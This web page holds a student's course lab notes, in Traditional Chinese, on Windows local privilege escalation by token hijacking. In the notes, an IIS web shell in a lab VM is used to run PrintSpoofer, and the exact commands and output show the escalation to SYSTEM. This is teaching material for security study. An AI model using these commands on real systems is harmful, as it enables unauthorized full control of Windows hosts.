<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  NTUSTISC - AD Note - Lab(Hijack Token)
  #

[TOC]
Lecture Video: 2022/05/04 AD 安全1

  Background
  #


提權方法

利用弱點
Hijack Token

Tools: PrintSpoofer
Support: Windows 8.1/Server 2012 R2/10/Server 2019
How to use: $ PrintSpoofer.exe -c "command"


Guess Password
管理服務
錯誤配置




  Lab Time - 本地提權
  #


  ==Hijack Token(Network Service)==
  #

這邊講師示範的是，如何利用IIS的特殊權限，達成提權。
先解釋一下，如果要使用PrintSpoofer之類的工具有個特殊的條件，就是需要有特殊權限，也就是
:::info
$ whoami /priv
需要有下列其一權限:
SeImpersonatePrivilege => CreateProcessWithToken()
SeAddignPrimaryToekn => CreateProcessAsUser()
:::


whoami /priv
我們先看一下正常使用者的特殊權限有哪些
$ whoami /priv

PRIVILEGES INFORMATION
----------------------

特殊權限名稱                  描述               狀況
============================= ================== ======
SeShutdownPrivilege           關閉系統           已停用
SeChangeNotifyPrivilege       略過周遊檢查       已啟用
SeUndockPrivilege             從擴充座移除電腦   已停用
SeIncreaseWorkingSetPrivilege 增加處理程序工作組 已停用
SeTimeZonePrivilege           變更時區           已停用
可以看到上述的權限都沒有在這裏面，也就是說正常的使用者是不會有這兩個權限的，那誰會有這兩個權限呢?需要==impersonation(也就是講師說的切換身分)的人==，詳細的腳本可以看這邊1但今天不會用到，總之IIS就是一個需要做身分切換的角色，所以講師已經在Win10的電腦中設定好IIS，也起用了web shell的功能，我們就可以試看看，在browser中http://127.0.0.1/cmd.aspx，他可以直接用IIS的權限執行程式
'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="NTUSTISC - AD Note - Lab(Hijack Token)"><meta property="og:description" content='NTUSTISC - AD Note - Lab(Hijack Token) # [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background # 提權方法 利用弱點 Hijack Token Tools: PrintSpoofer Support: Windows 8.1/Server 2012 R2/10/Server 2019 How to use: $ PrintSpoofer.exe -c "command" Guess Password 管理服務 錯誤配置 Lab Time - 本地提權 # ==Hijack Token(Network Service)== # 這邊講師示範的是，如何利用IIS的特殊權限，達成提權。 先解釋一下，如果要使用PrintSpoofer之類的工具有個特殊的條件，就是需要有特殊權限，也就是 :::info
$ whoami /priv 需要有下列其一權限: SeImpersonatePrivilege => CreateProcessWithToken() SeAddignPrimaryToekn => CreateProcessAsUser() :::
whoami /priv 我們先看一下正常使用者的特殊權限有哪些
$ whoami /priv PRIVILEGES INFORMATION ---------------------- 特殊權限名稱 描述 狀況 ============================= ================== ====== SeShutdownPrivilege 關閉系統 已停用 SeChangeNotifyPrivilege 略過周遊檢查 已啟用 SeUndockPrivilege 從擴充座移除電腦 已停用 SeIncreaseWorkingSetPrivilege 增加處理程序工作組 已停用 SeTimeZonePrivilege 變更時區 已停用 可以看到上述的權限都沒有在這裏面，也就是說正常的使用者是不會有這兩個權限的，那誰會有這兩個權限呢?需要==impersonation(也就是講師說的切換身分)的人==，詳細的腳本可以看這邊1但今天不會用到，總之IIS就是一個需要做身分切換的角色，所以講師已經在Win10的電腦中設定好IIS，也起用了web shell的功能，我們就可以試看看，在browser中http://127.0.0.1/cmd.aspx，他可以直接用IIS的權限執行程式'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="NTUSTISC"><meta property="article:tag" content="AD"><meta property="article:tag" content="Information Security"><title>NTUSTISC - AD Note - Lab(Hijack Token) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>NTUSTISC - AD Note - Lab(Hijack Token)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#lab-time---本地提權>Lab Time - 本地提權</a><ul><li><a href=#hijack-tokennetwork-service>==Hijack Token(Network Service)==</a></li></ul></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=ntustisc---ad-note---labhijack-token>NTUSTISC - AD Note - Lab(Hijack Token)
<a class=anchor href=#ntustisc---ad-note---labhijack-token>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=M0LV3dBCMCOy58LN&amp;t=3600">2022/05/04 AD 安全1</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li>提權方法<ul><li>利用弱點</li><li>Hijack Token<ul><li>Tools: <a href=https://github.com/itm4n/PrintSpoofer>PrintSpoofer</a></li><li>Support: Windows 8.1/Server 2012 R2/10/Server 2019</li><li>How to use: <code>$ PrintSpoofer.exe -c "command"</code></li></ul></li><li>Guess Password</li><li>管理服務</li><li>錯誤配置</li></ul></li></ul><h2 id=lab-time---本地提權>Lab Time - 本地提權
<a class=anchor href=#lab-time---%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%ac%8a>#</a></h2><h3 id=hijack-tokennetwork-service>==Hijack Token(Network Service)==
<a class=anchor href=#hijack-tokennetwork-service>#</a></h3><p>這邊講師示範的是，如何利用IIS的特殊權限，達成提權。
先解釋一下，如果要使用PrintSpoofer之類的工具有個特殊的條件，就是需要有特殊權限，也就是
:::info</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ whoami /priv
</code></pre><p>需要有下列其一權限:
SeImpersonatePrivilege => CreateProcessWithToken()
SeAddignPrimaryToekn => CreateProcessAsUser()
:::</p><ol><li><p>whoami /priv
我們先看一下正常使用者的特殊權限有哪些</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ whoami /priv

PRIVILEGES INFORMATION
----------------------

特殊權限名稱                  描述               狀況
============================= ================== ======
SeShutdownPrivilege           關閉系統           已停用
SeChangeNotifyPrivilege       略過周遊檢查       已啟用
SeUndockPrivilege             從擴充座移除電腦   已停用
SeIncreaseWorkingSetPrivilege 增加處理程序工作組 已停用
SeTimeZonePrivilege           變更時區           已停用
</code></pre><p>可以看到上述的權限都沒有在這裏面，也就是說正常的使用者是不會有這兩個權限的，那誰會有這兩個權限呢?需要==impersonation(也就是講師說的切換身分)的人==，詳細的腳本可以看這邊<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>但今天不會用到，總之IIS就是一個需要做身分切換的角色，所以講師已經在Win10的電腦中設定好IIS，也起用了web shell的功能，我們就可以試看看，在browser中<code>http://127.0.0.1/cmd.aspx</code>，他可以直接用IIS的權限執行程式
<img src=https://hackmd.io/_uploads/r1N1LMM03.png alt></p><p><img src=https://hackmd.io/_uploads/HySuBGMC2.png alt>
從結果來看，他的確具有==SeImpersonatePrivilege==的權限而且已經啟用，那我們就可以直接用PrintSpoofer.exe執行其他指令</p></li><li><p>Use PrintSpoofer.exe
<img src=https://hackmd.io/_uploads/rkqPUMGA2.png alt>
從結果來看，我們的確已經提權了，再來可以用講師的指令測試一下權限
<code>c:\tools\PrintSpoofer64.exe -c "c:\windows\system32\cmd.exe /c whoami > c:\inetpub\wwwroot\tmp.txt"</code>
這一串指令是利用PrintSpoofer執行cmd.exe再執行whoami的command並寫道tmp.txt中
<img src=https://hackmd.io/_uploads/rk0pwGzRh.png alt>
目前權限已經從<code>iis apppool\defaultapppool</code>轉換成<code>nt authority\system</code>也就是前面說的==本地端真正的最高權限使用者==</p></li></ol><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://ithelp.ithome.com.tw/articles/10252658>[2020鐵人賽] Day29 - 切換身分Impersonation </a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#lab-time---本地提權>Lab Time - 本地提權</a><ul><li><a href=#hijack-tokennetwork-service>==Hijack Token(Network Service)==</a></li></ul></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>